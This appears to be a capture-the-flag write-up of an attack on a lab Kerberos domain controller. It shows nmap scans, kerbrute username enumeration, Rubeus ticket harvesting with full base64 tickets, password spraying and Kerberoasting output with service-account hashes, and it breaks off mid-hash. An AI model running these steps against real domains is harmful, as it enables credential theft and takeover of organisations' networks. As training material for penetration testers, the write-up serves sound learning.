# CTF Writeup: Attacking Kerberos

---

## Reconaissance

Ran initial nmap scan


```
nmap -n -Pn -sS -p- 10.10.0.71                                             
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-13 09:49 CDT
Nmap scan report for 10.10.0.71
Host is up (0.10s latency).
Not shown: 65508 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49669/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49676/tcp open  unknown
49679/tcp open  unknown
49688/tcp open  unknown
49700/tcp open  unknown
49776/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 171.18 seconds
```

An Service Detection Scan revealed:

```
nmap -n -Pn -sSCV -p 22,53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001,49664,49665 10.10.0.71
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-13 09:59 CDT
Nmap scan report for 10.10.0.71
Host is up (0.030s latency).

PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:f2:8b:17:15:7c:90:d7:4e:0f:8e:d1:4c:6a:be:98 (RSA)
|   256 b0:3a:a7:c3:88:2e:c1:0b:d7:be:1e:43:1c:f7:5b:34 (ECDSA)
|_  256 03:c0:ee:58:32:ae:6a:cc:8e:1a:7d:8b:20:c8:a2:bb (ED25519)
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-13 15:00:00Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: CONTROLLER.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: CONTROLLER.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-09-13T15:00:58+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=CONTROLLER-1.CONTROLLER.local
| Not valid before: 2025-09-12T13:40:53
|_Not valid after:  2026-03-14T13:40:53
| rdp-ntlm-info: 
|   Target_Name: CONTROLLER
|   NetBIOS_Domain_Name: CONTROLLER
|   NetBIOS_Computer_Name: CONTROLLER-1
|   DNS_Domain_Name: CONTROLLER.local
|   DNS_Computer_Name: CONTROLLER-1.CONTROLLER.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-09-13T15:00:50+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CONTROLLER-1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-09-13T15:00:54
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.17 seconds
```

Mapped 10.10.0.71 in /etc/hosts to domainname: CONTROLLER.local

```
sudo echo "10.10.0.71 CONTROLLER.local" | sudo tee -a /etc/hosts
```

## Enumeration

In order to enumerate (stealthy) usernames in a domain, we can utilize kerbrute.


```
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 09/13/25 - Ronnie Flathers @ropnop

2025/09/13 09:55:01 >  Using KDC(s):
2025/09/13 09:55:01 >   CONTROLLER.local:88

2025/09/13 09:55:01 >  [+] VALID USERNAME:       admin2@CONTROLLER.local
2025/09/13 09:55:01 >  [+] VALID USERNAME:       administrator@CONTROLLER.local
2025/09/13 09:55:01 >  [+] VALID USERNAME:       admin1@CONTROLLER.local
2025/09/13 09:55:01 >  [+] VALID USERNAME:       httpservice@CONTROLLER.local
2025/09/13 09:55:01 >  [+] VALID USERNAME:       sqlservice@CONTROLLER.local
2025/09/13 09:55:01 >  [+] VALID USERNAME:       machine1@CONTROLLER.local
2025/09/13 09:55:01 >  [+] VALID USERNAME:       user3@CONTROLLER.local
2025/09/13 09:55:01 >  [+] VALID USERNAME:       user2@CONTROLLER.local
2025/09/13 09:55:01 >  [+] VALID USERNAME:       user1@CONTROLLER.local
2025/09/13 09:55:01 >  [+] VALID USERNAME:       machine2@CONTROLLER.local
2025/09/13 09:55:01 >  Done! Tested 100 usernames (10 valid) in 0.392 seconds
```

The machine itself prompted to me to login via rdp/ssh with one of the accounts I enumerated
administrator:P@$$W0rd.

```
ssh administrator@controller.local
```

## Harvesting & Brute-Forcing Tickets w/ Rubeus


Prompting the following command revealed us multiple TGT's of user accounts. 
The command itself tells Rubeus to harvest TGTs every 30 seconds.

```
Rubeus.exe harvest /interval:30


   ______        _                       
  (_____ \      | |                      
   _____) )_   _| |__  _____ _   _  ___  
  |  __  /| | | |  _ \| ___ | | | |/___) 
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: TGT Harvesting (with auto-renewal)
[*] Monitoring every 30 seconds for new TGTs
[*] Displaying the working TGT cache every 30 seconds


[*] Refreshing TGT ticket cache (9/13/2025 8:20:20 AM)

  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL 
  StartTime             :  9/13/2025 6:41:26 AM
  EndTime               :  9/13/2025 4:41:26 PM
  RenewTill             :  9/20/2025 6:41:26 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGw
Zr
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEhssFUi1LJoYAMfMuwDk+6DhFEjaNa0wA2
ZE
    dOHyItVDIIYIhpZJwkQh4E4Wz8WcM7FLCEmNNxl0veRPu3V0y2LDKYLXVGDWRfiNb/O92QYacA329wJ45n9b9JpBgWBkne8Jwk
2s
    QvhfQCdkgv76XubJKCAhUbcvjrODku5oK3L0anMwhuADltdUSa2KhI7JOSCIGVu8UJvVIAPK/51FY1BHUqUo5N7aO9TZysOnqa
ye
    LsykFKuRo/mQpP0FxO6WFHkWuSiUOGEBSJSGSl8dFM39gDC+GmXirgA7Ho5o9TIedG+fcIsycJ6ZhJPkBPB7OTs223zcoG4Q/r
w1
    r/2Q9ZZPIVunxe7wI2kQZ4JZg6k7/rMsn0AX+UvUIEyVjlz0s/NMrtEp7OHddfrCw1bzuP5rgQzqbRtaW76WObtY0g6TtPebLx
7C
    MFYW6FZGc785b2iEavYbOJXHZj2jVehwdVp0FbOyZoOjsOI9iMQF53KIDjuwi3xW9YlZ+8OByNmfJxSq6CHYQArA2uG0oZp+Jh
gm
    +oTCCow83RwuE35DvO4aeClA1gXQ0OTu/CSKER5vXEqvZxhRim3Pyy3dbc9wAY9MNx4uXE67mkaQa68iaInepqIKmmELBKY/zj
4I
    4be9LSEEF93xvaVgyRjeiF2jM81/BpJalnWU68AOTFWexkzCke+tYrKIhADIoyFvlkP4mgbTyhBrqMIC6xhbSvQlWTJ+GlsErg
VT
    /89Fnzrv7xdWT3Sz931QFVMvIs7Y7zgf5wGk+u9NLtlThttqow7YE7YRq/x5wZ9YCX3+ibEpVibHoXYTH/mEbAzYKg3EO2Bo1I
EI
    aK3nj0/0U9GaYwC/QmCrUTjJ0th0af4hICPCmFbuOsySRq/cvGA+92CfJnp1KGY1Cg1Aj3/nAkQO08s2VytmJaprIFR9uv5jVv
6u
    p9yp8YwTUwHRWJk3ZybH+aIpv2izEWE+SJtUmqVhTICVGBtImzaILWpPTA2ySq4MIcq/63Wskt+3lZ7w/RxI7sN7SFoLW7ic8J
Tg
    hqLYlFzM+kFWazuCn61nAJj8FHYKTjSC9mfE/cKMHP0hFb+sphp/7bnWdj5RlgPbdGI44I8X/7dNHVuxZKyABlx0n+/U/EVx7+
OK
    wu/s8rWKkvkx8bIZOLZlzXpThhC8CpR5NMakLlfRC7io8t7Tr5rm+xOkTxo0I7bWf7e80l2BxgEon2B4+oVtqvA6yQBrbKeM9O
Iq
    pmGVRuFWDb3xA7aKCYFKWarBPjzO+lWVyCuGyeMqQ/4EBobPd11kjngz75VWI7m6L3L8T+EdGuSdo/x98RQQFS2OHbc6QWQ2fq
Jj
    ZC106o1Zp7qbANuFpr13UBKUHlofjrpDc6hZD+MzDzQBQpKkdnI0MFOjgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2q
Ar
    MCmgAwIBEqEiBCCLG/Q7+bmShWqbI2peverAcdBkX0rfdB9nYWgSpXHntKESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoR
Ew
    DxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDI1MDkxMzEzNDEyNlqmERgPMjAyNTA5MTMyMzQxMjZapxEYDzIwMjUwOT
Iw
    MTM0MTI2WqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM

  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL
  StartTime             :  9/13/2025 6:41:26 AM
  EndTime               :  9/13/2025 4:41:26 PM
  RenewTill             :  9/20/2025 6:41:26 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGw
Zr
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEkVxequWI7CgpFIZ6fjnuNjIT8WbYAqaHj
n5
    uE5YTxc4bCsZyKsgGOlRsEI0CWlN0mefpl/i3Cndw0SAr+m5zRs5YR/SYv9s0o3MwbQzm7JXQ20gIQJD6pXmQ82+XUcSaCPUWJ
Aw
    DtkOfHsebF10zjHnB6a3DQfqY/NbEtIa5M+yemB4JnlVO4mBEPaKHJWAxJcW5+AgNcrG5Ra0thj9lhHsDBW1zN/MOwducTNrZt
lu
    ycLcoZnVwogyeV9G6AQ7TILM/mdDe+BoANE6I9G4ZMKYert0NM73UDnrrShGxq2XyZp/GHrklEipqCCGrQDnlGijYkRHS4UFK9
ll
    hRCJ0pJjDGx3iRK19moG/dnaeooQ5eeYsw8uuvTAYna8FQqAkdtO25zIVTMoJEBFz7PFLMM4GlGIwzx2zEbHL7YhY/Ex6YGVF6
6C
    4/orJuHHhfzlqrtFVtxJznjqXqhEP8kK+CwOSBYpbnr5JPXan6NVSkB1UPJFWS0TBJGOsapnjtcESWbmzeXhnUbXQzyEiqutb5
VK
    Wuu4bpHZh2g77wqdbXBxXaGNP/eYnqu8UIn8zRKkJWpS8Bo7zw6xOrloPUcQo57Yf5YtMOZIuDT1Dr0l8rbfuk38fMSL1QC0nO
XP
    UsdzKhGqrKC3MK3OFcvXc6MKQWHKsS0dKmZcXFXkLrqqVVJJbucnWAzyl/F5TNPai3p24FK8dqmVPraWQtUSA8P9YW6txWafCx
36
    hVJxCBoHo5h3zlvPL4Pg8hqss0tKQ6CQbmK+QsB7yEzHkt06CqkcR8AM9+kP1c15i99dZDR00VJMyuieyBiIcfkOdFJh9Yveh4
wJ
    nBNP//BUUOybyf5gmDzDdWWc6qWCws0KUQyWzzce+7/ssFfNDVWWZkMxJmwBlpig9wtg6dacrId7+9OEHRJh3ucBdgaf3izlQ/
/0
    c9ix34L1DoQzkgUrDubcT1bbUd2Gsciy42Lqyr2COazsBXC7CItgunZ8vinEh6yBDoM6fn3x2hTVNTH6xpzO3VYSqLbGknQMU4
1B
    cR8Z1Gv97XbSHchp/3H6Rs8/ivTcIPr69vwx/SDClsTwcoK/zhRJwKs6ZGI3SgmaYHiDCQFeoZ1M6GvExbp0oZdUyspPfY5dJ1
ma
    ehZUReTE33dBD/U5wdmFJo5F1WfngAr7tmbRRaQ0va4aovh229CvitGtkbqgY6uGHxSKY3n1oEWNpY7wAARBuOs1ZefeQOcocX
nx
    EMIbG79U7DdlCAp0frmDBH9eDaazmhpzzSfapkLpHFAhZ0MbYGgmbz7GRFcfPNYJNlzJckdzvBi8ou7MpCHLtezVv29qSDgrYG
PL
    HXFxUDqNnE/2QGx8jXucGAPWGaXgnWTBA1QjTzMN25PTrQ65zfOnXR2jgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2q
Ar
    MCmgAwIBEqEiBCAE0oWLVtb26C4o+IroNGyoEcLGrI0KFCrw7h1rimgoz6ESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoR
Ew
    DxsNQ09OVFJPTExFUi0xJKMHAwUAYKEAAKURGA8yMDI1MDkxMzEzNDEyNlqmERgPMjAyNTA5MTMyMzQxMjZapxEYDzIwMjUwOT
Iw
    MTM0MTI2WqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM

  User                  :  Administrator@CONTROLLER.LOCAL
  StartTime             :  9/13/2025 8:18:33 AM
  EndTime               :  9/13/2025 6:18:33 PM
  RenewTill             :  9/20/2025 8:18:33 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFjDCCBYigAwIBBaEDAgEWooIEgDCCBHxhggR4MIIEdKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGw
Zr
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQwMIIELKADAgESoQMCAQKiggQeBIIEGl3m+WRFkRpKRSEAb7hKiLnAbbPYC+ydu7
KB
    bhTu4xnZ7beQLwMMj+MxtjGfGMG44duGrClZYTFK0JiaB7SAxwvj+I/heMAGapxa4ihOuHRnznNMQYMILL5hBQ/I6s7USVYdYa
mp
    ynD91T3VcKe7D2jo8lbjxvDXJ0DU6/enQa5N+o8I26cn9WR//Ad5KTXmm1I96gnGiR53yLTYLMLyamwha1dCrEQBWsq49/O7Ii
82
    817myJj/d2TeEMZZx4HDd6Nppmi6s64cVHOj0Uq6SJkpbuvggPTNjExuYZugS8g0PPgKdGFxNrlsuVIlJ9W+jpIZB3cLBN7Gqc
aQ
    898fYlpKO+SNeyQB+7flP9RspkWhl0eWjqXCrWYjCK2C4ll+MJJPr1qMV8in+A94NuT1WfhfWTGOt1RHh9r6joyRdHpe78MfoO
Q0
    rFlPXCMCcNlbmxJM2eZkCqdCCOfQggi4b0N9mt/scwvAgbF7EducUlG/aHj2Cxw/TkiiECreMygsCUR9qMV9NtffdG94WcRhhy
dL
    DldxkaxtADzppHp1WsPgIBAk74lQJ3u7+MtEIiENeprr0QMuWoVY9utmjUsLgaNWENPJdO+x6xZk37SzD3rw6f1dGHkIEwhsgK
pX
    EJMjruBEk5bAhuzPmOUSiLvsu8YNXl8XmDhpP9q/awKm5BJEyMgjpoRnSACCEEfA/wm3vKzoiFzOPmHPqP7rQaDaPPspfxtDP1
/d
    UanUay6E/qOsKYsrEm0tFIQbuuVQ0Ppj2jcUp4/xtKDKcZr8/Jvv843vFwrikV+/NkxLRPQ+ZasblZ5MT8JqCyXGBReT/NOI0K
BY
    rILSzSbHiNteo7nSqOb9RsGdW5NFPj0ndKny5VZQJtQ/mycX/ImbA+IH5sZoH8V6waIsYUD7dGVtoC0D7X8QX6YWwyOWv/21iF
ct
    cVrkvsByriB72pClDjyXAz4CvlP0vxOW/Vd8UHd90FVmsprhEvUFfiWLsD27NlM0GCSiQWRD8D9GvjMFOaWYGTBs38TlNFZ40X
7S
    Ygj30BvpJsBnegTLEVM1f2SOv5QRzwyodQQP8di3xKnSynGXueoc/IiIdT0oSvOx1/x/rJ6Zt/prN6xIEA3Uyvf0M+w9+sNyXY
LF
    5sVXjgq6QyUh5PDOmFXSJjnQJEJ7RrddOmrODmkXgKH+n6dzchLIXwqcf7lBzJMXwwmqXoybnd1mBBgZlFNfuZ6/F+Npa5NQXn
FY
    MWbia5WUYHNS3z3lvOED/rAWdMn/b9bo8noOT4gpqwB5IN4L7FOYnd6El+tuYZcXchnO/OsquryTRtQc2QhtYHC0xlDXH3Abkg
Pj
    LS/UGMhCanzcHDl2ejpB2YW/GSMafrGZcBrxo4ZXDUMaajpwkfw+PhUn5h3x4PVHX6OB9zCB9KADAgEAooHsBIHpfYHmMIHjoI
Hg
    MIHdMIHaoCswKaADAgESoSIEIGbqmQqNbeS+eTb244OhODrPQicMT2wcqLJMdGJCIRa4oRIbEENPTlRST0xMRVIuTE9DQUyiGj
AY
    oAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBA4QAApREYDzIwMjUwOTEzMTUxODMzWqYRGA8yMDI1MDkxNDAxMTgzM1qnER
gP
    MjAyNTA5MjAxNTE4MzNaqBIbEENPTlRST0xMRVIuTE9DQUypJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIuTE9DQU
w=
```

If we want to perform password spraying with a specific password. We can also utilize Rubeus


```
Rubeus.exe brute /password:Password1 /noticket      

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[-] Blocked/Disabled user => Guest 
[-] Blocked/Disabled user => krbtgt 
[+] STUPENDOUS => Machine1:Password1 
[*] base64(Machine1.kirbi):

      doIFWjCCBVagAwIBBaEDAgEWooIEUzCCBE9hggRLMIIER6ADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyi
      JTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIubG9jYWyjggQDMIID/6ADAgESoQMCAQKiggPx
      BIID7boVSsfNed2BhdRhgsB66kSPq3/F+uOa34hBb9hM3/XEs6dhfuhj8VvNc1eaU4IC2XAlWpU9NAfm
      Gr/QztfrtErPJ/pj3M7zsIigHvJM18/OUyJ8l1ab3H0rfdOcl4nB172pgJn3U+zKj3F9sc3kMGn1fKUL
      wX5kbD47Prs12x+Rmcf/NuD3ngqEZ3LR51+Itg7skJNdzQTWi3fUCWmyltk8NuJr6PNPgRVlAHonEBVZ
      EJMHrrICuboGBPHaff2Ghk6v84z38MlIBQ8KS384lerrTItDtDG/XhFm1MIndi32N2ix/k9hwmMQXYvl
      Iv+5tkYjDTxfYxfFMXzMH1i/ERTiDhJAWYsXHKIZskIYi3TStc4ffA4a/zH/KPL0k+/wwjKxepV491oO
      fdKexOa2EBHzGpTNrrR4UnZz3hyOCgNooPz1OolXuJ0FnFPfDnIcarYkOwGt/jCXSx4dJHIY2s6AnPeC
      cHvL4i9Iy3/fmnPbqwqHB2Ga0xsRH2RZVBSMCQMEspizw+bTEjR7nFG1leovAW3SKbDvUuWDbIRjZc4A
      UTfUOY54rhJ9RZZu5JvEaboWfj94hhShdsiR7sOvhp9mHmKKzh/9OpgPiF9I7cOBVBvGrnhWCTDLaY9G
      I1A/R9CThOK5I1qKKJ2iYNoxo79JLp78C5ZmV8wE5A18L49QZc2Ws/OWE7n/QoCrRddKKqynk34iSbKC
      DZUJ5WwTFYFGo21DblKi8F/RvMeU+1FJle1Kl4H4sJIki5xA0SQ3as6Gm+dQ9ZOJ7VFbD1o55fIMvL6b
      ibDiXE/0VNfgJZD/ZTIYt0ENTsydMKXxrqsQ32R4i7q+lT74yv3ENBBu5TYd4XyP57kvthyHbmWLJJSe
      ln1DmF+jpDquwDvAgareonaqcnkUgyo9/yFUgBZDfOIhUcMLebzLOJPw2VIyS7n5XFwTeMhzS+/Jy825
      XQ6/HU2XhOIwveHoFonab5GFRlRvglyfwV0mg+gK/1i1Rw0JCTgvgriVYngOuaMgCM1XUQRg/sVJAdXW
      NvIcpMvdILQeRtbrT1keeR6CbMtvw8u9U+Tr9XnWDeg6AMNHr4RMOfIEXykIX2gbGhuUw7Btiuf22PZh
      Byh3MzVFxIHofOrY3yNEkqmimlNBjx+Bq0TqYICVkZO77x/iPJVIeAQInbwtVLdOV+io+u1HV0d5EgIC
      BT2OhGNk3whwf84Z2i9eqdc9EIYj8D0BsnXxSF1HQ08gMniVuexjsgjtBBFCy1vUFfKhC+t1rt7O+0ba
      /jWo15FYbQLSyz1tgX5CdJ2VSLi9rxTfTFPORQ8I4XqUN/req59g+NMB+ALMahnd16OB8jCB76ADAgEA
      ooHnBIHkfYHhMIHeoIHbMIHYMIHVoCswKaADAgESoSIEIB+jzWeLSnlklGfaeCJRT2konvWeFCvjeQYk
      v9YiQsdjoRIbEENPTlRST0xMRVIuTE9DQUyiFTAToAMCAQGhDDAKGwhNYWNoaW5lMaMHAwUAQOEAAKUR
      GA8yMDI1MDkxMzE1MjkxN1qmERgPMjAyNTA5MTQwMTI5MTdapxEYDzIwMjUwOTIwMTUyOTE3WqgSGxBD
      T05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLmxvY2Fs



[+] Done
```

## Kerberoasting

Running the following command will provide us with the hash of any kerberoastable users, the process is called Kerberoasting.

```
Rubeus.exe kerberoast

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts. 
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts. 

[*] Searching the current domain for Kerberoastable users

[*] Total kerberoastable users : 2


[*] SamAccountName         : SQLService
[*] DistinguishedName      : CN=SQLService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/SQLService.CONTROLLER.local:30111
[*] PwdLastSet             : 5/25/2020 10:28:26 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.loca 
                             l:30111*$21804B1AEF3C62128361B961848E2AAB$41ECDA1C5237ABBEE9361981D8BA390FFD690B 
                             B3A429377E2E2B1B7BE2528054C143065486D9B1D4B3CA069DE02EC8634B5433752AE773D4DA63E9
                             B853D8E2CDB4695281668FC2154C53D48A7E8FD18CAB7B3FB78D9E94FABE5BA0764314A5A34F803C
                             28245FA591453210B9D666063C1C941FFCF152EF2777C100A98536C6DCC1F96C5F893637000E8F92
                             6302FB5820D18A77E67AA5AF5D61A21F6D06B71CA91F14B20495D0CEAB6AC19D8D7FDE57D5E35974
                             8F6180E90ACD776E284F378792CBE3C8566E946B9341A273FDBF61D46D0DD24AB6A65BC49F28EFE5
                             BF1606D07C75BF23C4E90F039687199C8D125E74A20458F7F4CC5FF6D6E02F88F419F15198F07E54
                             292C06986DECB704FB3C93292CD0C00FDA0FC8C9C65A13E5749D7F07BA502BE8D5FB4963421647F6
                             995AD791C40418CC47ACC5B12B911DCC82111ACCADF6068807ED7663563FAAE4F0361055436779F8
                             4F4A6571665676A5CEBF7DDE356E666403863D947C08EAC8B97C105260C6B8C667B24A1727F01DD9
                             851DB32B4593825A5ACBBF826C6173DF07FF57A4BC570B439B7870792463B18BD4BAFE4A02AB42ED
                             63B8C28A56E0AE44E1BAB6E4097D78986E53206A2618C0B2A65C9620A08624E25F53DA99C96B33BE
                             01117CA37B8AE9FCA971DFA753ED8BA38DB7063A1858A23BEEB0E19F2280313CDEAF081BE1F069B7
                             36D39B3A555F79D14359E8397367533E3330D001B65EE46AC3CCFB5AB09BCE6A5431C3BC85AD1DA1
                             FF0B6596D0315C395DCDDAB19C9C58BE074141CDD16616E0AA0F8C2E4D11B11B4DE54CB6EAF69AD0
                             3C9A45C4304E7714E4A5C0DE9210A4E001D85C28F67F7D95C1557268CB19B927E4010BA89AA75731
                             A51A6BF5BF5B03C7BD42E82B66813CAD1E5BB9CE21418185C4670841381AEE9F333739CC71513271
                             73EEFA042AC839AC82854A832081FB912E9D8CB5B94E5084594F2C185285AC56ED35D336C68E6014
                             A2413F0CABA782915022D1FBAC1A2F9235D9C246F7DC6F00DABBEF5B7B1D009BD8663476AFD2665E
                             71C7CC09A58AF32714E86417E5E78CF4D544C11A87709284EED494D8540D0E3A127D931A52810C5D
                             7709F4286269DD6C90F7957F574617ADEEE8E99C856AA654AEC14D5F44D193257891B6A330876CF9
                             7294CFC594C1E874664BF7CEE6DBD203CA2B0F72EB961C4E5D78DBBA92F1FCC3E21166FFD7DAFF6C
                             E9717F24F37934F7BFF55F44F1C6D99D8DFFAB050C3D12B96C3A688DECDCE2D6F872B61C6DF20EEA
                             85BC96DC09136ACE46CB28EB537F722BF39386426AE2006C2BFA44228841678C06B69EF4DA3C6B94
                             2162B259E9ECF06405105259B3A704CDFB38F3B853899DA47508E1B85D83B0CEAB4BACD4F681CE54
                             9CA99C6A49BBB03C0F064690F81F686192C9869D5F247F87ABEA1767F7CE8C6B02B9F5D79F13774E
                             0E8EBF06DB6D8E1C2DC8A1E31DBFC62D4795D73C018AF490FA67E2460764A77FF20F97E44DD41964
                             576321BB0B3BE21450ACBCA442FAB678F20581C87DB1B55507D7A41D257DE77225EBEBF3BB8B98AD
                             179EB1B2C17413EAE4C204B4198F493313D1CF04387EF4F7E1B0B50D9F9EEC18E3D364EFD677C173
                             1875CEFE81E10C70254ED36552A9F14089B486C41585BE76AD6FA15A0F


[*] SamAccountName         : HTTPService
[*] DistinguishedName      : CN=HTTPService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/HTTPService.CONTROLLER.local:30222
[*] PwdLastSet             : 5/25/2020 10:39:17 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLER-1/HTTPService.CONTROLLER.lo
                             cal:30222*$CB2A84CC33B03B333E8C980563B85D52$0F87A3E49A900BE39432DFAB88D2E6D2788D
                             A845510269CD396CF7E0E1CCCE2962D9D93E68CE3BAC8272337C861A8F0047B03B6D3AEA5C279A1D
                             1F4A09A8E7C160D03C97398E907416C917CD3AFF5573008ABC385602D2D77B34DB4721BF1474A73A
                             7F09F9E8F7D7FC9B6E8B31D17466CD1435D5E46819DEC5B33FC612147FFE18F42C18DB3152BB1EC8
                             19D52E1CBF4B2435213D94CBD3F25F3728E441AF11D03E901937B982AD005B966CBFBD39B6066E82
                             E0A3A69BA894C41CF03C0F7E4949ED038FAB2DE3A94C465B662F1631E10090E6DFE1FBBD8A1A76EB
                             EAAF4A15DFDD2E725DF93A9C71075F07820F0BB31DFDEEF963B40F8C433F34E08516C5C320BB52A9
                             6AAFA2F621412249E61EFC03BC270F064297EFD51744E92E5E9A27A136D46EDC39CF1026F0010845
                             D5E687FBF92FBF65108C2AD3DE99DF236EC22E496F3D3927D0BD51EF2790108DD11D6D37A8F94A25
                             7D78E9373A145F296C84D99A83AEE4FF9F44D55B85FFA78AC1CA131874C1505AAE7584A48C9A2C0D
                             13C27D7261A7873BA586D8611D7CCA6DFD2D54769D42D087C421B7BBC29B20D6D7D4C8B094F8C623
                             76B04CFCB6A8B4129D7266B6ED68D429BC9B20F9F026D4020AFAF26A419B9CBD7FF21A4F28B019A3
                             75B8CC85B3D056F4B9555E29AA1A6B6C68C236CDDE9307CAB33231C18EB7D8FDB0A8753D7B244766
                             FD05BB9542F96CC9A00A74C56F20A993A0361C8786F15D2496414401A74A67C9FF4AC61FCB3FDE54
                             CE42FF3B9AFBB14687920F1CE44BD43FE2E5FCB2A29D2295ED36A26C0F0849FB800F60C029E9BADE
                             A2E928E05D07B3E0A89C774141370F921AA510E5B8C98B0ADD5E58B582A443B4E5A74FDC587518C6
                             EE1F6B6C439541FB4C178B5E11700DA5F71A49FD9D39BFB2FEB305FEF0FF9440A13DDB43BA6EC2B6
                             8574AB09A0BF144C38D329C0AEC425B1742D010266E4540D951A385EB30803039B9BFC0B8530F63E
                             FA30594A8636FC37C2ACE31B9C287F312E90E187E71FCE4DBF29EE2D5497A4EB963EB80DBAF363B9
